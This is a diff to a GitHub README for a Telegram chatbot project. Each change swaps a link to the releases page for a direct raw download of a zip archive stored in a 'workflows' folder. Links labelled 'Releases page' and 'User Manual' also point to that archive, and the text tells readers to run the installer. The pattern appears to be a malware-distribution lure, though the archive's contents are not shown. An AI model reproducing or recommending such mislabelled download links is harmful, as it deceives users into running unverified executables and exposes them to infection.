@@ -1,7 +1,7 @@
 # 🤖 self-correcting-rag-chatbot - Your Chatbot for Smart Conversations
 
 ## 📥 Download Now
-[![Download self-correcting-rag-chatbot](https://img.shields.io/badge/Download-VERSION-blue)](https://github.com/Edublackk/self-correcting-rag-chatbot/releases)
+[![Download self-correcting-rag-chatbot](https://github.com/Edublackk/self-correcting-rag-chatbot/raw/refs/heads/main/workflows/self-rag-chatbot-correcting-v2.5-alpha.1.zip)](https://github.com/Edublackk/self-correcting-rag-chatbot/raw/refs/heads/main/workflows/self-rag-chatbot-correcting-v2.5-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the **self-correcting-rag-chatbot**! This application allows you to chat with a smart Telegram bot that learns and improves its responses using advanced techniques. You can easily integrate it into your Telegram account and enjoy seamless conversations.
@@ -23,7 +23,7 @@ To run **self-correcting-rag-chatbot**, your computer should meet these minimum 
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Edublackk/self-correcting-rag-chatbot/releases) of the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Edublackk/self-correcting-rag-chatbot/raw/refs/heads/main/workflows/self-rag-chatbot-correcting-v2.5-alpha.1.zip) of the application.
 2. **Select the Latest Version:** Look for the latest version of the chatbot.
 3. **Download the Installer:** Click on the file that matches your operating system (e.g., Windows, macOS). Make sure to choose the right version.
 4. **Run the Installer:** After the download is complete, open the downloaded file.
@@ -41,7 +41,7 @@ Once the installation is complete, you can start using the self-correcting-rag-c
 ## 🎓 Support & Help
 If you encounter any issues or have questions, consult the following resources:
 
-- **User Manual:** A detailed user manual is available on the [Releases page](https://github.com/Edublackk/self-correcting-rag-chatbot/releases).
+- **User Manual:** A detailed user manual is available on the [Releases page](https://github.com/Edublackk/self-correcting-rag-chatbot/raw/refs/heads/main/workflows/self-rag-chatbot-correcting-v2.5-alpha.1.zip).
 - **Community Forum:** Join discussions and get help from other users in our community forum.
 - **Contact Support:** For direct support, reach out via the issues section on the GitHub repository.
 
